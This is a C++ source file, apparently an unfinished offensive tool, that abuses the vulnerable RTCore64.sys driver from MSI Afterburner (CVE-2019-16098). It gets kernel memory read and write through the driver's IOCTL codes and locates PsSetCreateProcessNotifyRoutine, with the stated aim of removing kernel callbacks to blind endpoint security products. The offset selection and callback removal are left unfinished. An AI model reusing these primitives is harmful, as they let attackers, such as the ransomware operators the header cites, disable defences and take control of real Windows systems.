/*
    By: ReverseThrottle @ReverseThrottle
    Identify kernel callbacks and remove them ussing RTCore64.sys vulnerability within MSI Afterburner
    !!Disclaimer I am not an expert and am using resources that I find the information/code 
    !!Disclaimer I present is not new and heavily inspired by my resources that I mention below
    CVE-2019-16098 - https://github.com/Barakat/CVE-2019-16098/blob/master/CVE-2019-16098.cpp - Heavily used code for kernel read/write primitives
    Other resources:
    CheeckyBlinder - https://github.com/br-sn/CheekyBlinder @no bs
    Kernel Ps Callbacks - http://blog.deniable.org/posts/windows-callbacks/ @fdiskyou
    BlackByte Ransomware utilizes techinque - https://www.picussecurity.com/resource/blog/blackbyte-ransomware-bypasses-edr-products-via-rtcore64.sys-abuse

*/



#include <Windows.h>
#include <aclapi.h>
#include <Psapi.h>
#include <cstdio>
#include <iostream>



struct WinVersionOffsets {
    DWORD64 process;
    DWORD64 image;
    DWORD64 thread;
    DWORD64 registry;
};

struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;


DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}
BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 1, Address) & 0xffffff;
}


WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}


void Log(const char* Message, ...) {
    const auto file = stderr;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}



int main()
{
    //
    //Determine Windows version
    //
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[*] Windows Version %s Found!\n", value);
    auto winVer = _wtoi(value);
    switch (winVer)
    {
    case 1909:
        wprintf(L"\t[*] Offsets have been set for Windows version %s!\n", value);
        // Set to WinVersionOffsets values needed for Windows version
        break;
    case 2004:
        wprintf(L"\t[*] Offsets have been set for Windows version %s!\n", value);
        // Set to WinVersionOffsets values needed for Windows version
        break;
    case 2009:
        wprintf(L"\t[*] Offsets have been set for Windows version %s!\n", value);
        // Set to WinVersionOffsets values needed for Windows version
        break;
    }

    //
    // Determine required offsets based on Windows version
    //
    
    /*
        Finsih later
    */

    
    //
    // Obtain handle to RTCore64.sys 
    //
    HANDLE hRTCore64;
    hRTCore64 = CreateFileW(LR"(\\.\RTCore64)", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hRTCore64 == INVALID_HANDLE_VALUE) {
        Log("[!] Failed to obtain handle to RTCore64...Error Code: %d\nIs driver enabled??", GetLastError());
        getchar();
        return -1;
    }
    Log("[*] RTCore device handle has been obtained: Handle: %p", hRTCore64);
    getchar();

    //
    // Obtain ntoskrnl base address
    //
    DWORD cbNeeded = 0;
    LPVOID drivers[1024];
    DWORD64 NtoskrnlAddress;

    Log("[*] Attempting to obtain Ntoskrnl base address");
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        NtoskrnlAddress = (DWORD64)drivers[0];
        Log("[*] Ntoskrnl base address: %p", NtoskrnlAddress);
        getchar();
    }
    else {
        Log("[!] Failed to obtain Ntoskrnl base address\n Error code: %d", GetLastError());
        getchar();
        return -1;
    }

    //
    // Obtain PsSetCreateNotifyRoutine()
    //
    HMODULE Ntoskrnl;
    DWORD64 offsetPsSet;
    DWORD64 addressPsSet;


    Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    offsetPsSet = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetCreateProcessNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
    addressPsSet = NtoskrnlAddress + offsetPsSet;
    Log("Address of PsSetCreateProcessNotifyRoutine: %p", addressPsSet);
    FreeLibrary(Ntoskrnl);
    getchar();

    //
    // Obtain PspSetCreateNotifyROutine()
    //
    DWORD64 bytes = { 0x1B6E8C2950F };
    ULONG64 i = 0;
    DWORD64 content = ReadMemoryDWORD64(hRTCore64, addressPsSet + 10);
    Log("Print %p", content);
    Log("Print % p", bytes);
    if (content == bytes) {
        Log("YAY");
    }
    Log("%p", content + 3);
    getchar();
    /*
        Working on getting PspSetCreateProcessNotifyRoutine Address
    */

    
    //
    //Enumerate callback array
    //

}

